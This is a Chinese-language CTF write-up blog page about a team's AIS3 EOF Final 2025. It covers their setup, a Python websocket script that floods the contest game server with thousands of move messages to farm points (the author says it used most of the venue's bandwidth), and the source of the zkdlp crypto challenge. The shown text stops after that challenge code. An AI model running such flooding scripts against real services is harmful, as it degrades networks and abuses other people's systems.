<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Before allTeam: CakeisTheFakeRank: 2同時也拿了個炸彈超人獎，後續會講為什麼   第二年打 EOF，只能說感覺起來自己能力確實成長不少，相比於去年矇懂的狀態真的好上許多 XD但還是太菜了，後門被 Ching 笑 QQ感謝我的隊友 @Flydragon @Aukro @Naup 還有臨時拉來的 @Afan @Chisheng Chen 一起打這場盛事   蛋糕的勝利">
<meta property="og:type" content="article">
<meta property="og:title" content="AIS3 EOF FINAL 2025 Write Up">
<meta property="og:url" content="http://wha13.github.io/2025/02/09/eof-final-2025/index.html">
<meta property="og:site_name" content="Whale120&#39;s Blog">
<meta property="og:description" content="Before allTeam: CakeisTheFakeRank: 2同時也拿了個炸彈超人獎，後續會講為什麼   第二年打 EOF，只能說感覺起來自己能力確實成長不少，相比於去年矇懂的狀態真的好上許多 XD但還是太菜了，後門被 Ching 笑 QQ感謝我的隊友 @Flydragon @Aukro @Naup 還有臨時拉來的 @Afan @Chisheng Chen 一起打這場盛事   蛋糕的勝利">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hackmd.io/_uploads/r1KxHhHFyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJezfiHY1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/Bkvq7irYkg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S1khXoSKye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HklydBirK1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJDKSsSF1x.png">
<meta property="og:image" content="https://hackmd.io/_uploads/ByuVwsBY1e.png">
<meta property="og:image" content="https://hackmd.io/_uploads/rJCLqhHKyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/BySuHhHYJg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HycN92SYye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SyASc3HFyg.png">
<meta property="og:image" content="https://hackmd.io/_uploads/S13ZqhBtkl.png">
<meta property="article:published_time" content="2025-02-09T16:51:20.000Z">
<meta property="article:modified_time" content="2025-02-09T06:00:49.652Z">
<meta property="article:author" content="William Lin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="CakeisTheFake">
<meta property="article:tag" content="EOF">
<meta property="article:tag" content="Franklin–Reiter Attack">
<meta property="article:tag" content="PRNG">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hackmd.io/_uploads/r1KxHhHFyg.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AIS3 EOF FINAL 2025 Write Up</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/27/x3ctf-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/02/09/eof-final-2025/&text=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/02/09/eof-final-2025/&is_video=false&description=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AIS3 EOF FINAL 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/02/09/eof-final-2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/02/09/eof-final-2025/&title=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/02/09/eof-final-2025/&name=AIS3 EOF FINAL 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/02/09/eof-final-2025/&t=AIS3 EOF FINAL 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Infra"><span class="toc-number">2.</span> <span class="toc-text">Infra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">3.</span> <span class="toc-text">Day 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day1-%E6%99%9A%E4%B8%8A-Day2-%E4%B8%80%E9%96%8B%E5%A7%8B%E7%9A%84-Crypto-%E4%B9%8B%E6%97%85"><span class="toc-number">4.</span> <span class="toc-text">Day1 晚上 ~ Day2 一開始的 Crypto 之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zkdlp"><span class="toc-number">4.1.</span> <span class="toc-text">zkdlp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prsa"><span class="toc-number">4.2.</span> <span class="toc-text">prsa</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2"><span class="toc-number">5.</span> <span class="toc-text">Day 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">6.</span> <span class="toc-text">After all</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AIS3 EOF FINAL 2025 Write Up
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">William Lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-02-09T16:51:20.000Z" class="dt-published" itemprop="datePublished">2025-02-09</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/CakeisTheFake/" rel="tag">CakeisTheFake</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/EOF/" rel="tag">EOF</a>, <a class="p-category" href="/tags/Franklin%E2%80%93Reiter-Attack/" rel="tag">Franklin–Reiter Attack</a>, <a class="p-category" href="/tags/PRNG/" rel="tag">PRNG</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Team: CakeisTheFake<br>Rank: 2<br>同時也拿了個炸彈超人獎，後續會講為什麼  </p>
<p>第二年打 EOF，只能說感覺起來自己能力確實成長不少，相比於去年矇懂的狀態真的好上許多 XD<br>但還是太菜了，<del>後門被 Ching 笑 QQ</del><br>感謝我的隊友 @Flydragon @Aukro @Naup 還有臨時拉來的 @Afan @Chisheng Chen 一起打這場盛事  </p>
<p><img src="https://hackmd.io/_uploads/r1KxHhHFyg.png" alt="image"><br>蛋糕的勝利🥳  </p>
<h2 id="Infra"><a href="#Infra" class="headerlink" title="Infra"></a>Infra</h2><p>賽前我準備了 Destructive Farm 當 Attack Manager，但開賽後發現好像土炮 while 迴圈交 flag 就好…<br>另外就是透過 JumpBox 主機跳進比賽內網，開 openvpn 串網路出去<br>安裝連結們<br><a target="_blank" rel="noopener" href="https://github.com/DestructiveVoice/DestructiveFarm/tree/master">Destructive Farm (LINK)</a><br><a target="_blank" rel="noopener" href="https://github.com/hwdsl2/openvpn-install/tree/master">OpenVPN (LINK)</a><br>但我顯然不是一個好的賽博水管工，本來沒什麼問題 但開賽後有隊友要 RDP 回家才能連 VPN …  </p>
<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>這次的賽程很特別，有 A&amp;D, KoH 和 Jeopardy<br>恩，對，你沒看錯，決賽打 Jeopardy，<del>甚至三題有兩題Crypto</del><br>快速介紹一下一開始出來的兩個KoH好了：<br>3. Bombe：<br>HITCON 的時候奧義就有出的 EDR V.S. Malware 的病毒對決，各個隊伍都要上自己的防毒 &amp; 病毒。其中病毒要完成開檔案，讀取記憶體和連線的功能；防毒則是抓出病毒檔案就好<br>4. Game：<br>一款迷宮走路遊戲，可以用<del>未知</del>的方法開寶箱，攻擊對手等，但一開始連方向鍵都是壞的…<br><img src="https://hackmd.io/_uploads/rJezfiHY1e.png" alt="image">  </p>
<p>5, 6, 7 都是 Jeopardy 我們覺得不急迫就留著當回家作業了  </p>
<p>一開始只有 Game 是好的，所以我就先看了 Game，摸索了一陣隊友們好像沒逆出東西就先去看封包了：<br>最初是本地開 WireShark，但…<del>我們忘記有VPN這東西所以流量被加密過</del>，所以最後我是跳去 Jump Box 錄製<br><img src="https://hackmd.io/_uploads/Bkvq7irYkg.png" alt="image"><br>登入流程是：發送 Login 訊息 &#x3D;&gt; Server 回傳 helloworld &#x3D;&gt; 發送 Login 訊息 &#x3D;&gt; 驗證<br><del>為什麼同樣的東西要發兩次啊</del><br>其他資料都好大坨，所以嚴格來說只有分析到走路的封包<br><img src="https://hackmd.io/_uploads/S1khXoSKye.png" alt="image">  </p>
<p>不過好消息是：<del>走路也可以拿分數</del>，於是就開始了兩天走路之旅~<br>恩，對，一路到第二天我們都還是靠著(<del>開一坨 Process</del>)走路分領先，但不小心炸了會場 90% 的流量 … (抱歉)<br><strong>walker.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">websocket, token</span>):</span><br><span class="line">    login_message = &#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> websocket.send(json.dumps(login_message))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Login sent once&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> websocket.send(json.dumps(login_message))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Login sent twice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_move_data</span>(<span class="params">websocket, direct</span>):</span><br><span class="line">    datas = &#123;<span class="string">&#x27;u&#x27;</span>: [<span class="number">0</span>, -<span class="number">1</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">0</span>, <span class="number">1</span>], <span class="string">&#x27;r&#x27;</span>: [<span class="number">1</span>, <span class="number">0</span>], <span class="string">&#x27;l&#x27;</span>: [-<span class="number">1</span>, <span class="number">0</span>]&#125;</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> datas: </span><br><span class="line">        move_message = &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;move&quot;</span>,</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;vec&quot;</span>: [randrange(-<span class="number">1</span>, <span class="number">1</span>), randrange(-<span class="number">1</span>, <span class="number">1</span>)],</span><br><span class="line">                <span class="string">&quot;facing&quot;</span>: [randrange(-<span class="number">1</span>, <span class="number">1</span>), randrange(-<span class="number">1</span>, <span class="number">1</span>)]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(move_message))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Move message sent&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">websocket</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Raw response received: <span class="subst">&#123;response[:<span class="number">1000</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response) &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="number">0</span>] == <span class="number">0x81</span>:</span><br><span class="line">                    opcode = response[<span class="number">0</span>] &amp; <span class="number">0x0F</span></span><br><span class="line">                    length = response[<span class="number">1</span>] &amp; <span class="number">0x7F</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> length == <span class="number">0x7F</span>:</span><br><span class="line">                        length = <span class="built_in">int</span>.from_bytes(response[<span class="number">2</span>:<span class="number">10</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                        payload = response[<span class="number">10</span>:]</span><br><span class="line">                    <span class="keyword">elif</span> length == <span class="number">0x7E</span>:</span><br><span class="line">                        length = <span class="built_in">int</span>.from_bytes(response[<span class="number">2</span>:<span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                        payload = response[<span class="number">4</span>:]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        payload = response[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        data = payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Received data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            json_data = json.loads(data)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;JSON data received: <span class="subst">&#123;json_data&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;Non-JSON data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Failed to decode payload to UTF-8.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Received empty response.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error receiving data: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_websocket_connection</span>(<span class="params">uri, token</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri, max_size=<span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        asyncio.create_task(receive_data(websocket))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> login(websocket, token)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">5000</span>):</span><br><span class="line">            <span class="keyword">await</span> send_move_data(websocket, <span class="string">&#x27;u&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Login requests completed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    uri = <span class="string">&quot;ws://10.102.100.20:8440&quot;</span></span><br><span class="line">    token = <span class="string">&quot;298956eca545bc623493bac595eb72e1&quot;</span></span><br><span class="line"></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        task = create_websocket_connection(uri, token)</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>這就是我們得特別獎的理由 (紫色是我們的流量🫠)<br><img src="https://hackmd.io/_uploads/HklydBirK1e.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/SJDKSsSF1x.png" alt="image">  </p>
<p>Bmobe 的話大家第一天都在適應，甚至最厲害的 EDR 就是偵測檔案裏有沒有<code>flag1</code>的字樣，而病毒就是用字串加法混一混檔案而已…<br>其他就是攻防 A&amp;D 的題目第一天後續也有上，不過比較虧的是當下前三名看不到封包  </p>
<h2 id="Day1-晚上-Day2-一開始的-Crypto-之旅"><a href="#Day1-晚上-Day2-一開始的-Crypto-之旅" class="headerlink" title="Day1 晚上 ~ Day2 一開始的 Crypto 之旅"></a>Day1 晚上 ~ Day2 一開始的 Crypto 之旅</h2><p>這次 Jeopardy 分數是從 1500 ~ 5000 分動態調分，以比賽最後的分數呈現來講一題 Jeopardy 甚至會抵掉一到兩個 A&amp;D or KoH 的分數…，可以說 Jeopardy 定生死  </p>
<p>先上個 Maple 說的話：<br><img src="https://hackmd.io/_uploads/ByuVwsBY1e.png" alt="image">  </p>
<p><del>我真的信了，甚至一開始還戳到比較難的那題當簡單題</del>  </p>
<h3 id="zkdlp"><a href="#zkdlp" class="headerlink" title="zkdlp"></a>zkdlp</h3><p><strong>chal.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> shake_128</span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x2CDE2997126F706BD27498A9FA07E93F321B4932982BC455910FF694160DB5484257D0886EC66E5D7BE59ECFD16AAFF6B5BD57E600FAB97E7CF75D76A7F12BC4619A036ED8787F4508CC7C1FB35689575E007B7DC6B1EECC4B9BC2E91AA31FBE027C62BFF3E2065912591ECC1C361CEEAE75B382F1BD7D967633FD91476A3ABC4AD22CD3372C3FC40C2841B3BC70DAC11E3A6631AB3BE49AB9F748AE9093FBAB15B5457244363F444D146C0ADE84CC1AB0D0CFB2AD329483E957235EDD0085BD2F5CDAFCD77D00622A9DFCD3C0098DCB42C7EF1DEE808E8216F0F0638F51D26614B0C61352A13565098FE60146FF7E46FAEBCB75629DAF517880E36AEEE617B9F</span></span><br><span class="line">q = (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(g, q, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line">    hflag = shake_128(flag.encode()).digest(q.bit_length() // <span class="number">8</span>)</span><br><span class="line">    x = bytes_to_long(hflag)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Do you know the flag?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;y = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    wins = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> wins &lt; <span class="number">10</span>:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;t = &quot;</span>)) % p</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Nope&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        c = random.randrange(q)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>)) % q</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(g, s, p) == t * <span class="built_in">pow</span>(y, c, p) % p:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hmm, you probably know the flag!&quot;</span>)</span><br><span class="line">            wins += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No, you don&#x27;t know the flag :(&quot;</span>)</span><br><span class="line">            wins = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Okay, I am finally convinced that you know the flag:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

